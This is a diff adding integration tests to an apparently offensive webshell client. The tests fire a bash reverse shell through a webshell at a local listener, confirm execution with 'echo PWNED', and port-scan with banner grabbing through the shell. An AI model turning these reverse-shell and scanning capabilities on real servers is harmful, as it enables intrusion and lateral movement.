@@ -2,6 +2,9 @@
 
 from __future__ import annotations
 
+import socket
+import threading
+import time
 from pathlib import Path
 
 import pytest
@@ -9,7 +12,7 @@ import pytest
 from webshell_sniper.config import Config
 from webshell_sniper.core.php import php_string
 from webshell_sniper.core.webshell import WebShell
-from webshell_sniper.features import files, recon
+from webshell_sniper.features import files, portscan, recon, revshell
 
 pytestmark = pytest.mark.integration
 
@@ -102,6 +105,60 @@ def test_upload_file(live_shell: WebShell, tmp_path: Path):
     assert files.upload(live_shell, local, remote)
     assert files.file_exists(live_shell, remote)
     assert "uploaded-" in files.read_file(live_shell, remote)
+
+
+def test_reverse_shell_bash_connects_back(php_target: dict[str, object], tmp_path: Path):
+    """Fire a bash reverse shell at a local listener and confirm it executes."""
+    ws = WebShell(
+        f"{php_target['base']}/index.php", "POST", "c", Config(output_dir=tmp_path, timeout=4)
+    )
+    assert ws.connect()
+
+    server = socket.socket()
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("127.0.0.1", 0))
+    server.listen(1)
+    port = server.getsockname()[1]
+    received: dict[str, bytes] = {}
+
+    def handle() -> None:
+        conn, _ = server.accept()
+        conn.sendall(b"echo PWNED\n")
+        time.sleep(1)
+        received["data"] = conn.recv(4096)
+        conn.close()
+
+    thread = threading.Thread(target=handle)
+    thread.start()
+    revshell.reverse_shell(ws, "127.0.0.1", port, method="bash")
+    thread.join(timeout=10)
+    server.close()
+    assert b"PWNED" in received.get("data", b"")
+
+
+def test_port_scan_with_banner(php_target: dict[str, object], tmp_path: Path):
+    """Scan a local service that greets on connect and confirm the banner shows."""
+    server = socket.socket()
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind(("127.0.0.1", 0))
+    server.listen(1)
+    port = server.getsockname()[1]
+
+    def greet() -> None:
+        conn, _ = server.accept()
+        conn.sendall(b"SSH-2.0-TestBanner\r\n")
+        time.sleep(0.2)
+        conn.close()
+
+    threading.Thread(target=greet, daemon=True).start()
+    ws = WebShell(
+        f"{php_target['base']}/index.php", "POST", "c", Config(output_dir=tmp_path, timeout=10)
+    )
+    assert ws.connect()
+    output = portscan.port_scan(ws, "127.0.0.1/32", str(port), banner=True)
+    server.close()
+    assert f"127.0.0.1:{port} open" in output
+    assert "TestBanner" in output
 
 
 def test_cwd_tracking(php_target: dict[str, object], tmp_path: Path):
